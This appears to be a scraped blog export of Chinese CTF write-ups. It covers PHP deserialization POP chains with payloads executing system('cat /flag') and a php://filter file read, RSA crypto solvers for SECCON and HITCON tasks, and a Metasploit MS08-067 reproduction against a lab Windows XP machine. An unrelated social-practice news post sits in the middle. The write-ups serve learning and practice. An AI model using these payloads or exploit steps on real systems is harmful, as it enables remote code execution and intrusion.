Collection?垃圾回收，就是把内存中不需要使用的量给清除掉，收回它所占用的空间。\n\n旧的GC，在PHP5.3版本之前，使用的垃圾回收机制是单纯的“引用计数”。\n每个内存对象都分配一个计数器，当内存对象被变量引用时，计数器+1\n当变量引用撤掉后，即执行unset()后，计数器-1\n当计数器=0时，表明内存对象没有被使用，该内存对象则进行销毁，垃圾回收完成\n\n\n\n这个时候就出现了问题，我自己引用我自己，自身一个，自己又被引用，所以计数器是2，但我将它销毁，才减1，此时明明已销毁，但还是1，所以无法进行回收，产生了内存泄漏。\n\n新的GC\n\n每个PHP变量存在一个叫zval的变量容器中。一个zval变量容器，除了包含变量的类型和值，还包括两个字节的额外信息。\n第一个是is_ref，是个布尔值，用来标识这个变量是否是属于引用集合。通过这个字节，PHP引擎才能把普通变量和引用变量区分开来，由于PHP允许用户通过使用&amp;来使用自定义引用，zval变量容器中还有一个内部引用计数机制，来优化内存使用。\n第二个额外字节是refcount，用以表示指向这个zval变量容器的变量个数。所有的符号存在一个符号表中，其中每个符号都有作用域。\nBypass再回到刚刚那个例子，我们假如要执行__destruct方法，调用eval()，就得绕过这个throw new Error。因为__destruct方法是在该对象被回收时调用，而抛出错误会中断该进程对该对象的销毁。所以我们需要强制让GC去回收这个对象，方法就是反序列化一个数组，然后再利用第一个索引，来触发GC\n&lt;?phpclass Cargo{    public $secret;    public function __construct()    {        $this-&gt;secret = 'system(\"ls\")';    }}$str = serialize(array(new Cargo, new Cargo));echo $str;?&gt;// outputa:2:{i:0;O:5:\"Cargo\":1:{s:6:\"secret\";s:12:\"system(\"ls\")\";}i:1;O:5:\"Cargo\":1:{s:6:\"secret\";s:12:\"system(\"ls\")\";}}\n我们利用第一个索引，所以将后面改为第一个元素索引即可，也可以多加几个来进行触发。\nPayload: a:2:{i:0;O:5:\"Cargo\":1:{S:6:\"secret\";s:13:\"system('ls');\";}i:0;i:0};}\n\nPOP像上面的反序列化攻击更多的是魔术方法中出现一些利用的漏洞，如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来\n！动启，案档蓝蔚回顾一下招新赛的反序列化\n&lt;?phperror_reporting(0);highlight_file(__FILE__);class Archive {    protected $game;    public function __construct($game=\"总力战\"){        $this-&gt;game=$game;        echo \"快去打\".$game.\"&lt;br&gt;\";    }    public function launch($what){        echo $what.\"启动！&lt;br&gt;\";        eval($what);    }    public function __get($obj){        $this-&gt;launch($this-&gt;game);        return \"&lt;br&gt;hi&lt;br&gt;\";    }}class Blue{    public $source;    public $str;    public function __construct($welcome='蔚蓝档案启动器！&lt;br&gt;'){        $this-&gt;source = $welcome;        echo '欢迎来到'.$this-&gt;source.\"&lt;br&gt;\";    }    public function __toString(){        return $this-&gt;str-&gt;source;    }}class Printer{    public $content;    public function __construct($content=\"还想找大叔玩？&lt;br&gt;\"){        echo \"word count:\".strlen($content);        $this-&gt;content=$content;        $this-&gt;print();    }    public function __destruct(){        echo \"word count:\".strlen($content).\"&lt;br&gt;\";        $this-&gt;print();    }    public function print(){        echo $this-&gt;content.\"&lt;br&gt;\";    }}$what=new Blue();$is=new Printer();$it=new Archive();if(isset($_POST['ba'])){    unserialize($_POST['ba']);}else{    die(\"走错了捏&lt;br&gt;\");}\n首先扫一遍发现了利用点在Archive 类的launch()方法中的eval($what)\n\neval() 函数把字符串按照 PHP 代码来计算。\n\n继续观察，launch()方法在__get()方法中被调用\n\n魔术方法__get()用于从不可访问的属性读取数据或者不存在这个键都会调用此方法\n\n观察发现可能是在Blue类中的__toString()方法，它返回了$this-&gt;str-&gt;source，那么我们就可以构造str为一个Archive对象，通过调用Archive中不存在的$source来成功调用__get()方法\n\n魔术方法__toString()在把类当作字符串使用时触发\n\n再次观察，在Printer类的__construct()方法中，它会将对象初始化时的传参$content在strlen()方法中被当做字符串调用，那么就可以成功调用__toString()方法\n构造payload\n// $c = new Archive(\"system('ls /');\"); $c = new Archive(\"system('cat /flag');\"); $b = new Blue();$b -&gt; str = $c;$a = new Printer();$a -&gt; content = $b;echo urlencode(serialize($a));// payload: O%3A7%3A%22Printer%22%3A1%3A%7Bs%3A7%3A%22content%22%3BO%3A4%3A%22Blue%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A28%3A%22%E8%94%9A%E8%93%9D%E6%A1%A3%E6%A1%88%E5%90%AF%E5%8A%A8%E5%99%A8%EF%BC%81%3Cbr%3E%22%3Bs%3A3%3A%22str%22%3BO%3A7%3A%22Archive%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00game%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7D%7D%7D\nAreUSerialz&lt;?phpinclude(\"flag.php\");highlight_file(__FILE__);class FileHandler {    protected $op;    protected $filename;    protected $content;    function __construct() {        $op = \"1\";        $filename = \"/tmp/tmpfile\";        $content = \"Hello World!\";        $this-&gt;process();    }    public function process() {        if($this-&gt;op == \"1\") {            $this-&gt;write();        } else if($this-&gt;op == \"2\") {            $res = $this-&gt;read();            $this-&gt;output($res);        } else {            $this-&gt;output(\"Bad Hacker!\");        }    }    private function write() {        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {            if(strlen((string)$this-&gt;content) &gt; 100) {                $this-&gt;output(\"Too long!\");                die();            }            $res = file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output(\"Successful!\");            else $this-&gt;output(\"Failed!\");        } else {            $this-&gt;output(\"Failed!\");        }    }    private function read() {        $res = \"\";        if(isset($this-&gt;filename)) {            $res = file_get_contents($this-&gt;filename);        }        return $res;    }    private function output($s) {        echo \"[Result]: &lt;br&gt;\";        echo $s;    }    function __destruct() {        if($this-&gt;op === \"2\")            $this-&gt;op = \"1\";        $this-&gt;content = \"\";        $this-&gt;process();    }}function is_valid($s) {    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;}if(isset($_GET{'str'})) {    $str = (string)$_GET['str'];    if(is_valid($str)) {        $obj = unserialize($str);    }}\n先从正向看，首先先用GET获取了str，并将其转换成字符串，再对其进行is_valid()检查，通过后对其进行反序列化\n\nis_valid()\n\nfunction is_valid($s) {    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;}\n对传入的字符串每一位进行检查，要求每一位的ASCII值必须介于32与125之间，即所有可见字符（除了~）\n\n__destruct()\n\n根据上面我们做的Triggering Sequence测试，可以知道在这里会先触发__destruct()方法\nfunction __destruct() {        if($this-&gt;op === \"2\")            $this-&gt;op = \"1\";        $this-&gt;content = \"\";        $this-&gt;process();}\n如果op === “2”，那么op会被赋值为“1”，然后content会赋值为空，并执行process()`方法，这里的判断用的是强类型比较。\n\nprocess()\n\npublic function process() {        if($this-&gt;op == \"1\") {            $this-&gt;write();        } else if($this-&gt;op == \"2\") {            $res = $this-&gt;read();            $this-&gt;output($res);        } else {            $this-&gt;output(\"Bad Hacker!\");        }}\n如果op == “1”，执行write()函数；如果op ==“2”，执行read函数，同时将结果赋值给$res，然后输出；否则将输出\"Bad Hacker！\"。这里的判断用的是弱类型比较\n\nread()\n\nprivate function read() {        $res = \"\";        if(isset($this-&gt;filename)) {            $res = file_get_contents($this-&gt;filename);        }        return $res;}\n在read()方法中，使用filename调用file_get_contents()方法将文件内容赋值给$res返回。对于filename，我们可以用filter伪协议读取文件，再使用output()方法输出。\n但是这里的filename是protected类型的，在对其进行序列化时会出现以下情况\n&lt;?phpclass FileHandler {    protected $op=2;    protected $filename=\"php://filter/read=convert.base64-encode/resource=flag.php\";    protected $content;}$f = new FileHandler();echo serialize($f).\"\\n\";echo urlencode(serialize($f));// outputO:11:\"FileHandler\":3:{s:5:\"*op\";i:2;s:11:\"*filename\";s:57:\"php://filter/read=convert.base64-encode/resource=flag.php\";s:10:\"*content\";N;}O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A5%3A%22%00%2A%00op%22%3Bi%3A2%3Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3Bs%3A10%3A%22%00%2A%00content%22%3BN%3B%7D%   \n在protected类型的属性前面，会出现\\x00，而其显然不是可见字符，无法通过is_valid()方法\n我们查询一下环境的PHP版本：\n\n在高版本的PHP中，其对属性类型不敏感，所以我们可以直接将其改成public类型\npayload: ?str=O:11:\"FileHandler\":3:{s:2:\"op\";i:2;s:8:\"filename\";s:57:\"php://filter/read=convert.base64-encode/resource=flag.php\";s:7:\"content\";N;}\n这样就会输出flag.php的Base64编码之后的内容，解码之后就能得到flag了\nHomeWork\n复现！动启，案档蓝蔚和AreUSerialz\n\n解出ez_yii（主站上有）\n\n\n","categories":["CTF"],"tags":["CTF","WEB","PHP unserialize"]},{"title":"pqpq [SECCON2022]","url":"/2023/03/22/pqpq/","content":"pqpq [SECCON2022]Analyze先上题\nfrom Crypto.Util.number import *from Crypto.Random import *from flag import flagp = getPrime(512)q = getPrime(512)r = getPrime(512)n = p * q * re = 2 * 65537assert n.bit_length() // 8 - len(flag) &gt; 0padding = get_random_bytes(n.bit_length() // 8 - len(flag))m = bytes_to_long(padding + flag)assert m &lt; nc1p = pow(p, e, n)c1q = pow(q, e, n)cm = pow(m, e, n)c1 = (c1p - c1q) % nc2 = pow(p - q, e, n)print(f\"e = {e}\")print(f\"n = {n}\")# p^e - q^e mod nprint(f\"c1 = {c1}\")# (p-q)^e mod nprint(f\"c2 = {c2}\")# m^e mod nprint(f\"cm = {cm}\")# e = 131074# n = 587926815910957928506680558951380405698765957736660571041732511939308424899531125274073420353104933723578377320050609109973567093301465914201779673281463229043539776071848986139657349676692718889679333084650490543298408820393827884588301690661795023628407437321580294262453190086595632660415087049509707898690300735866307908684649384093580089579066927072306239235691848372795522705863097316041992762430583002647242874432616919707048872023450089003861892443175057# c1 = 92883677608593259107779614675340187389627152895287502713709168556367680044547229499881430201334665342299031232736527233576918819872441595012586353493994687554993850861284698771856524058389658082754805340430113793873484033099148690745409478343585721548477862484321261504696340989152768048722100452380071775092776100545951118812510485258151625980480449364841902275382168289834835592610827304151460005023283820809211181376463308232832041617730995269229706500778999# c2 = 46236476834113109832988500718245623668321130659753618396968458085371710919173095425312826538494027621684566936459628333712619089451210986870323342712049966508077935506288610960911880157875515961210931283604254773154117519276154872411593688579702575956948337592659599321668773003355325067112181265438366718228446448254354388848428310614023369655106639341893255469632846938342940907002778575355566044700049191772800859575284398246115317686284789740336401764665472# cm = 357982930129036534232652210898740711702843117900101310390536835935714799577440705618646343456679847613022604725158389766496649223820165598357113877892553200702943562674928769780834623569501835458020870291541041964954580145140283927441757571859062193670500697241155641475887438532923910772758985332976303801843564388289302751743334888885607686066607804176327367188812325636165858751339661015759861175537925741744142766298156196248822715533235458083173713289585866\n目前我们只知道，，稍加分析：\n\n\\begin{align}\nc_1&=p^e-q^e&(mod\\ n)\\\\\nc_2&=(p-q)^e\\\\\n&=p^e-p^{e-1}q+...-pq^{e-1}+q^e&(mod\\ n)\\\\\nc_1+c_2&=(p^e-q^e)+(p^e-p^{e-1}q+...-pq^{e-1}+q^e)\\\\\n&=(p^e+p^e-p^{e-1}+...-pq^{e-1})+(q^e-q^e)\\\\\n&=p(p^{e-1}+p^{e-1}-p^{e-2}q+...-q^{e-1})\\\\\n&=k_1p&(mod\\ n)\\\\\nc_1-c_2&=(p^e-q^e)-(p^e-p^{e-1}q+...-pq^{e-1}+q^e)\\\\\n&=(p^e-p^e)+(-q^e+p^{e-1}q-...+pq^{e-1}-q^e)\\\\\n&=q(-q^{e-1}+p^{e-1}-...+pq^{e-2}-q^{e-1})\\\\\n&=k_2q&(mod\\ n)\\\\\ngcd(c_1+c_2,n)&=gcd(k_1p,n)\\\\\n&=gcd(k_1p,pqr)\\\\\n&=p\\\\\ngcd(c_1-c_2,n)&=gcd(k_2q,n)\\\\\n&=gcd(k_2q,pqr)\\\\\n&=q\\\\\nr&=\\frac{n}{pq}\\\\\n\\end{align}到此我们便可获得p，q，r\n由于，并不与互素，无法直接计算逆元d，但我们知道p，q，r的值，所以便可计算的8个可能值，筛选后即可得到flag\nEXPfrom Crypto.Util.number import *from sympy.ntheory.modular import *from gmpy2 import *from itertools import *e = 131074n = 587926815910957928506680558951380405698765957736660571041732511939308424899531125274073420353104933723578377320050609109973567093301465914201779673281463229043539776071848986139657349676692718889679333084650490543298408820393827884588301690661795023628407437321580294262453190086595632660415087049509707898690300735866307908684649384093580089579066927072306239235691848372795522705863097316041992762430583002647242874432616919707048872023450089003861892443175057c1 = 92883677608593259107779614675340187389627152895287502713709168556367680044547229499881430201334665342299031232736527233576918819872441595012586353493994687554993850861284698771856524058389658082754805340430113793873484033099148690745409478343585721548477862484321261504696340989152768048722100452380071775092776100545951118812510485258151625980480449364841902275382168289834835592610827304151460005023283820809211181376463308232832041617730995269229706500778999c2 = 46236476834113109832988500718245623668321130659753618396968458085371710919173095425312826538494027621684566936459628333712619089451210986870323342712049966508077935506288610960911880157875515961210931283604254773154117519276154872411593688579702575956948337592659599321668773003355325067112181265438366718228446448254354388848428310614023369655106639341893255469632846938342940907002778575355566044700049191772800859575284398246115317686284789740336401764665472cm = 357982930129036534232652210898740711702843117900101310390536835935714799577440705618646343456679847613022604725158389766496649223820165598357113877892553200702943562674928769780834623569501835458020870291541041964954580145140283927441757571859062193670500697241155641475887438532923910772758985332976303801843564388289302751743334888885607686066607804176327367188812325636165858751339661015759861175537925741744142766298156196248822715533235458083173713289585866p=gcd(c1+c2,n)q=gcd(c1-c2,n)r=n//p//q#Tonelli-Shanksdef legendre(a, p):    return pow(a, (p - 1) // 2, p)def tonelli(n, p):    r = []    assert legendre(n, p) == 1, \"not a square (mod p)\"    q = p - 1    s = 0    while q % 2 == 0:        q //= 2        s += 1    if s == 1:        return pow(n, (p + 1) // 4, p)    for z in range(2, p):        if p - 1 == legendre(z, p):            break    c = pow(z, q, p)    r = pow(n, (q + 1) // 2, p)    t = pow(n, q, p)    m = s    t2 = 0    while (t - 1) % p != 0:        t2 = (t * t) % p        for i in range(1, m):            if (t2 - 1) % p == 0:                break            t2 = (t2 * t2) % p        b = pow(c, 1 &lt;&lt; (m - i - 1), p)        r = (r * b) % p        c = (b * b) % p        t = (t * c) % p        m = i    return rphi=(p-1)*(q-1)*(r-1)dp=invert(e//2,p-1)dq=invert(e//2,q-1)dr=invert(e//2,r-1)mp2=pow(cm,dp,p)mq2=pow(cm,dq,q)mr2=pow(cm,dr,r)mp=tonelli(mp2,p)mq=tonelli(mq2,q)mr=tonelli(mr2,r)print(mp)print(mq)print(mr)'''for _mp, _mq, _mr in product([mp, p - mp], [mq, q - mq], [mr, r - mr]):    m = [p, q, r]    v = [_mp, _mq, _mr]    print(long_to_bytes(crt(m, v)[0]))'''for mp1,mq1,mr1 in product([mp,p-mp],[mq,q-mq],[mr,r-mr]):    x=[mp1,mq1,mr1]    y=[p,q,r]    print(long_to_bytes(crt(y,x)[0]))\n","categories":["CTF"],"tags":["CTF","CRYPTO","RSA"]},{"title":"RPC-exploit - MS08-067","url":"/2023/03/23/rpc-exploit/","content":"\n\nMS08-067 (aka CVE-2008-4250) 漏洞复现前期准备RPC漏洞\nRPC是什么\n\n​        RPC（Remote Procedure Call， 远程过程调用）是操作系统的一种消息传递功能，它是一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的协议。RPC协议假定某些传输协议的存在，如TCP或UDP，为通信程序之间携带信息数据。在OSI网络通信模型中，RPC跨越了传输层和应用层。RPC使得开发包括网络分布式多程序在内的应用程序更加容易。\n\n微软的描述为：“一种能允许分布式应用程序调用网络上不同计算机的可用服务的消息传递实用程序。在计算机的远程管理期间使用”\n\n\nRPC的三个过程\n\n通讯协议\n比如：你需要找人在国外干活，那么你可以直接飞过去或者打电话或者通过互联网的形式，去找人，这个找人的过程就是通讯协议\n\n寻址\n既然要找人干活，肯定要知道地址在哪，飞过去需要找到详细地址，打电话需要知道电话号码，互联网需要知道IP是多少\n\n数据序列化\n就是说，语言需要互通，才能够让别人干活，之间需要一个大家都懂的语言去交流\n\n\n\n攻击RPC漏洞\n  攻击RPC漏洞其实就是攻击DCOM接口，二者相关联\n\nDCOM（分布式组件对象模型,分布式组件对象模式）是一系列微软的概念和程序接口。利用这个接口，客户端程序对象能够请求来自网络中另一台计算机上的服务器程序对象，DCOM基于组件对象模型COM，COM提供了一套允许同一台计算机上的客户端和服务器之间进行通信的接口\n\n\n\n复现环境\n攻击机：kali-linux-2022.4-vmware-amd64\n靶机：Windows  XP SP3\n\n复现工具\nMSF\n即Metasploit Framwork，是一个综合性的渗透测试工具，集成信息收集、漏洞扫描、漏洞利用以及提权等功能的工具，目前安装的kali都自带MSF\n\nNmap\n即Network Mapper，是一款开源免费的网络发现（Network Discovery）和安全审计（Security Auditing）工具。一般情况下，Nmap用于列举网络主机清单、管理服务升级调度、监控主机或服务运行状况。Nmap可以检测目标机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息。\n\n\n漏洞介绍MS08-067漏洞是通过MSRPC over SMB通道调用Server服务程序中的NetPathCanonicalize函数时触发的，而NetPathCanonicalize函数在远程访问其他主机时，会调用NetpwPathCanonicalize函数，对远程访问的路径进行规范化,而在NetpwPathCanonicalize函数中发生了栈缓冲区内存错误，造成可被利用实施远程代码执行。\n\nWindows的Server服务在处理特制RPC请求时存在缓冲区溢出漏洞，远程攻击者可以通过发送恶意的RPC请求触发这个溢出，导致完全入侵用户系统，SYSTEM权限执行任意指令。对于Windows 2000、XP 和Server 2003，无需认证便可以利用这个漏洞 ，对于Windows Vista和Server 2008，可能需要进行认证。\n\n影响范围Microsoft Windows 2000 Service Pack 4Windows XP Service Pack 2Windows XP Service Pack 3Windows XP Professional x64 EditionWindows XP Professional x64 Edition Service Pack 2Windows Server 2003 Service Pack 1Windows Server 2003 Service Pack 2Windows Server 2003 x64 EditionWindows Server 2003 x64 Edition Service Pack 2Windows Server 2003 SP1Windows Server 2003 SP2Windows Vista 和 Windows Vista Service Pack 1Windows Vista x64 Edition 和 Windows Vista x64 Edition Service Pack 1Windows Server 2008（用于 32 位系统）Windows Server 2008（用于基于 x64 的系统）Windows Server 2008（用于基于 Itanium 的系统）Windows 7 Beta（用于 32 位系统）Windows 7 Beta x64 EditionWindows 7 Beta（用于基于 Itanium 的系统）\n漏洞复现目标获取C:\\GIFT\\目录下的flag\n检测通信首先获取攻击机与靶机各自的IP地址\n\n攻击机（kali）\nIP:192.168.80.128\n\n\n靶机（Windows XP）IP:192.168.80.130\n\n\n\n并且要保证二者能互相通信\nkali能ping通xp\n\nxp能ping通kali\n\n如果发现出现超时等Error，则可能是xp的防火墙未关闭，关闭即可\n检查靶机是否开启了445端口，在cmd中执行netstat -an即可\n\n如图所示TCP 0.0.0.0:445的状态为LISTENING，则说明端口445已被打开\n为什么是”445”端口？\n端口的作用\n我们知道，一台拥有IP地址的主机可以提供许多服务，比如Web服务、FTP服务、SMTP服务等，这些服务完全可以通过1个IP地址来实现。那么，主机是怎么区分不同的网络服务呢？显然不能只靠IP地址，因为IP地址与网络服务的关系是一对多的关系，实际上是通过“IP地址+端口号”来区分不同的服务的。\n需要注意的是，端口并不是一一对应的。比如你的电脑作为客户机访问一台WWW服务器时，WWW服务器使用“80”端口与你的电脑通信，但你的电脑则可能使用“3456”这样的端口。如下图所示：\n\n\n端口的分类\n端口共1-65535号，知名端口范围从0到1023，这些端口号一般固定分配给一些服务，大家尽量不要使用。比如21端口分配给FTP服务，25端号分配给SMTP邮件传输协议服务，80端口分配给HTTP服务，135端口分配给RPC远程过程调用服务等等。\n动态端口的范围从1024到65535，这些端口号一般不固定分配给某个服务，也就是说许多服务都可以使用这些端口。只要运行的程序向系统提出访问网络的申请，那么系统就可以从这些端口号中分配一个供该程序使用。比如1024端口就是分配给第一个向系统发出申请的程序，在关闭程序进程后，就会释放所占用的端口号。注意，端口冲突就不能正常工作。\n同时，动态端口号也常常被病毒木马程序所利用，如冰河默认连接端口号是7626、WAY 2.4连接端口号是8011、Netspy 3.0连接端口号是7306、YAI病毒连接端口号是1024等等。\n\n常见的端口\n\n\n\n\n黑客通过端口可以干什么\n\n信息收集\n目标探测\n服务判断\n系统判断\n角色分析\n\n\n445端口\n参考链接：https://blog.csdn.net/qq_36119192/article/details/83279527\n比如2017年危害全球的永恒之蓝，就是利用的445端口。\n445端口就是利用SMB（Server Message Block）Windows协议族，用于文件共享、打印共享的服务。445端口是一个毁誉参半的端口，有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机，但也正是因为有了它，黑客们才有了可乘之机，他们能通过该端口偷偷共享你的硬盘，甚至会在悄无声息中将你的硬盘格式化\n公开服务器打开139和445端口是一件非常危险的事情。 如果有Guest帐号，而且没有设置任何密码时，就能够被人通过因特网轻松地盗看文件。如果给该帐号设置了写入权限，甚至可以轻松地篡改文件。也就是说在对外部公开的服务器中不应该打开这些端口。通过因特网使用文件服务器就等同自杀行为，因此一定要关闭445端口。对于利用ADSL永久性接入因特网的客户端机器可以说也是如此。\n\n\n漏洞扫描利用kali的Nmap工具对靶机进行信息搜集，先进入nmap得漏洞插件目录，检查ms08-067模块\n┌──(root㉿kali)-[~/Desktop]└─# cd /usr/share/nmap/scripts                                                                ┌──(root㉿kali)-[/usr/share/nmap/scripts]└─# ls    \n\n现在使用命令nmap --script=vuln 192.168.80.130对靶机进行漏洞扫描：主机存活，445端口开放，且存在MS08-067漏洞。\n\n执行msfconsole，进入MSF\n\n用search ms08-067命令查看可利用模块\n\n使用use exploit/windows/smb/ms08_067_netapi进入模块里，并用show options查看使用说明\n\n其中RHOSTS代表靶机地址，此时为空，需要我们手动设置，而LHOST代表攻击机，IP已被自动设置，使用set rhost 192.168.80.130设置靶机地址\n\n使用exploit进行渗透攻击，并使用shell直接跳转到靶机命令行\n\n找到flag.txt后使用type打开即可\n\n\nflag:flag{n1ce_try_0f_MS08_067}\n漏洞分析MS08-067漏洞是通过MSRPC over SMB通道调用Server服务程序中的NetPathCanonicalize函数时触发的，而NetPathCanonicalize函数在远程访问其他主机时，会调用NetpwPathCanonicalize函数，对远程访问的路径进行规范化，而在NetpwPathCanonicalize函数中发生了栈缓冲区内存错误，造成可被利用实施远程代码执行。\n所谓路径规范化，就是将路径字符串中的[/]转换为[\\]，同时去除相对路径[.\\]和[..\\]。如：**/*/./**   =&gt;  **\\*\\****\\*\\..\\**  =&gt;  **\\**\n在路径规范化的操作中，服务程序对路径字符串的地址空间检查存在逻辑漏洞。攻击者通过精心设计输入路径，可以在函数去除[…\\]字符串时，把路径字符串中内容复制到路径串之前的地址空间中（低地址），达到覆盖函数返回地址，执行任意代码的目的。\n通过IDA Pro打开C:\\windows\\system32\\netapi32.dll，找到漏洞所在的NetpwPathCanonicalize函数并双击。通过观察其流程图CFG可知，此函数并没有直接进行输入路径和规范化，而是调用了下级函数CanonicalizePathName来进行路径整理，将待整理的路径字符串进行规范化，然后再保存到预先分配的输出路径缓冲区buffer中，最终造成缓冲区溢出漏洞。\n","categories":["Vulnerability_recurrence"],"tags":["RPC","MS08-067"]},{"title":"暑期社会实践纪实","url":"/2023/08/25/social_practice/","content":"\n\n以红色为先，我们在路上​        红色文化具有独特魅力和跨越时空的价值。红色文化不单是抽象的载体，更蕴含着时代精神与价值追求。当前，全党正深入开展党史学习教育，探讨如何传承红色文化具有重要的现实意义与理论价值。习近平总书记在党史学习教育动员大会上特别强调，“抓好青少年学习教育，让红色基因、革命薪火代代传承。”红色文化蕴藏着党史学习教育的时代价值，红色文化资源是党史学习教育的有效载体，每一件革命文物、每一处战斗遗迹、每一位革命英烈，都是鲜活的革命历史教材，都折射着中国共产党人的坚定信念、崇高理想、爱国情操。\n​        本次实践我们大连理工大学“传承红色基因，争当科创人才”实践团依习总书记在2021年3月在福建考察时的路线，深入学习红色理论知识，感受红色文化，学习党史，从红色资源中汲取精神滋养和前进力量，赓续红色血脉。\n\n​        在7月25日，本实践团前往大连博物馆进行参观学习与宣传。在博物馆内，我们按照展览区域的顺序，参观大连市的历史发展、抗日战争、解放战争、社会主义建设等主题展览，并认真观看、记录、思考和讨论展品和文字介绍。我们重点关注大连市的革命先烈们的英雄事迹和崇高精神，感受他们为国家和人民的奉献和牺牲。回到学校后，我们进行了一次总结会议，由带队老师和队长对本次活动进行评价和反馈。\n\n​        在7月31日，实践队队长赵淳皓同学在返回上海后，带队前往上海市测绘院，上海电器科学研究所有限公司，上海市地震局进行参观，科普游学与宣传活动，感受红色文化，宣传红色知识，并收到了来自相关单位的感谢信。\n\n\n\n​        本次实践组织目的旨在了解大连的革命历史和革命先辈的事迹，相关文化、艺术和文学等领域的知识，在实践中感悟历史，领略革命文化的魅力；学习革命先烈，激发青年大学生的爱党之情；了解红色历史，缅怀革命先烈，继承和发扬老一辈革命家一切从实际出来，面对困难，奋勇直前的精神，不断增强中国特色社会主义的道路自信、理论自信、制度自信、文化自信，勇于进行具有许多新的历史特点的伟大斗争，坚决战胜前进道路上的各种艰难险阻。\n","categories":["News"],"tags":["Social","News"]},{"title":"superprime [HITCON 2022]","url":"/2023/03/22/superprime/","content":"superprime [HITCON2022]Analyze先上题\ntask.py\nfrom Crypto.Util.number import getPrime, isPrime, bytes_to_longdef getSuperPrime(nbits):    while True:        p = getPrime(nbits)        pp = bytes_to_long(str(p).encode())        if isPrime(pp):            return p, ppp1, q1 = getSuperPrime(512)p2, q2 = getSuperPrime(512)p3, q3 = getSuperPrime(512)p4, q4 = getSuperPrime(512)p5, q5 = getSuperPrime(512)n1 = p1 * q1n2 = p2 * p3n3 = q2 * q3n4 = p4 * q5n5 = p5 * q4e = 65537c = bytes_to_long(open(\"flag.txt\", \"rb\").read().strip())for n in sorted([n1, n2, n3, n4, n5]):    c = pow(c, e, n)print(f\"{n1 = }\")print(f\"{n2 = }\")print(f\"{n3 = }\")print(f\"{n4 = }\")print(f\"{n5 = }\")print(f\"{e = }\")print(f\"{c = }\")\noutput.txt\nn1 = 132240475872174910020944408159013384770525986234801028624784519134365862704105251340824787510945183963356820885920367304711310957365047441178683686926111455575911962257698539064559510444855775549001648292058855493337857073693460061212792795075263084221929517773754699732129582794061997056827998985829666251060653380798686353779510948629280009197715644814616657550158740378670095210797455828266323922570838468050733341304227070902756780052159113811360169205531739117518635829837403006788948761106892086004133969899267757339921n2 = 95063555614573541810575593850289506856925979977609991181205616159125089261546784721154599484613262518469706157215924537125160406418217535531993036958388330505871763176297570429533467696205928686731756713059807727405313286020007347211892135226632724359291407913539632339885950358476265995466145680878334722001n3 = 59077122528757446350604269162079270359932342538938986760275099248290981958441838384256597839386787448447136083450980256330743221155636885358548541847176342745397373638152767362253944731433134474562146358334422503033973244936835557423934491676324297243326613498319086748647812745223753746779568080090592100960499863677438403657325762852705171109382084916335379889394829715777901290096314487661584614712488781379507151355301063123233880909931925363322846957197537676660047824476129446066149857051131731840540157488590899311381370266592295206055792990886734933291304077440476730373491475852882163732120626849448728573574411786320772125534383707413572678316508826450778346723441956945169297689138799298561759843280317867927205551400065163199599457n4 = 24589423756497058585126900932611669798817346035509889383925628660158156567930038333401661451846451875869437263666365776498658699865323180836374906288949824205543130261556051807217164348291174483234810669420041361857307271050079366739157441129916338485838528114129985080841445467007786565727910355311119650431197742495274527401569906785121880408809802492383216836691265423297722021017515667257863302820657924121913047547741420413553737917632809270380269758313556777803344394624408862183672919570479289614998783678080936272369083n5 = 185885020243714550225131939334004568560534422416697599024696590344782893162219788079305752632863387855011040772104676488940707663157284194641170875157382507202789029285286466326803699701161968587945867047101502048926016515139728368809523009828247173096909917611001113266938209226483162533302629909322412013492978440863258135181226831155024690292336026753678424906151360739424148666951389956182136072508650529271179749569637083537783283360860102371562796635391549934474381821125255176073752645643893294533330184238070085333427e = 65537c = 44836759088389215801662306050375432910426695023654894661152471598197009644316944364461563733708795401026569460109604554622161444073404474265330567406370705019579756826106816505952084633979876247266812002057927154389274998399825703196810049647324831928277737068842860115202258059693760003397831075633707611377854322143735834890385706873765241863615950449707047454133596389612468366465634011925228326638487664313491916754929381088396403448356901628825906815317934440495749705736715790281606858736722493438754469493049523175471903946974639097168758949520143915621139415847104585816466890751841858540120267543411140490236193353524030168152197407408753865346510476692347085048554088639428645948051171829012753631844379643600528027854258899402371612\nPhase 1首先观察一下函数getSuperPrime(nbits)，其首先生成一个nbits位的素数p，将其转换为字符串后用函数bytes_to_long()再次转换，循环直到结果为素数pp为止，返回值为p，pp，查看一下bytes_to_long()的源码：\ndef bytes_to_long(s):    \"\"\"Convert a byte string to a long integer (big endian).    In Python 3.2+, use the native method instead::        &gt;&gt;&gt; int.from_bytes(s, 'big')    For instance::        &gt;&gt;&gt; int.from_bytes(b'\\x00P', 'big')        80    This is (essentially) the inverse of :func:`long_to_bytes`.    \"\"\"    acc = 0    unpack = struct.unpack    # Up to Python 2.7.4, struct.unpack can't work with bytearrays nor    # memoryviews    if sys.version_info[0:3] &lt; (2, 7, 4):        if isinstance(s, bytearray):            s = bytes(s)        elif isinstance(s, memoryview):            s = s.tobytes()    length = len(s)    if length % 4:        extra = (4 - length % 4)        s = b'\\x00' * extra + s        length = length + extra    for i in range(0, length, 4):        acc = (acc &lt;&lt; 32) + unpack('&gt;I', s[i:i+4])[0]    return acc\n整个函数就是把参数的每一个字节转成16进制然后拼起来，显然，p越大，pp也越大，那么我们便可以对进行二分规约\n#Phrase 1def l2b2l(p):    trans=str(p).encode()    return(bytes_to_long(trans))def break1(n):    l=0    r=2**512    v=0    while(l&lt;=r):        m=(l+r)//2        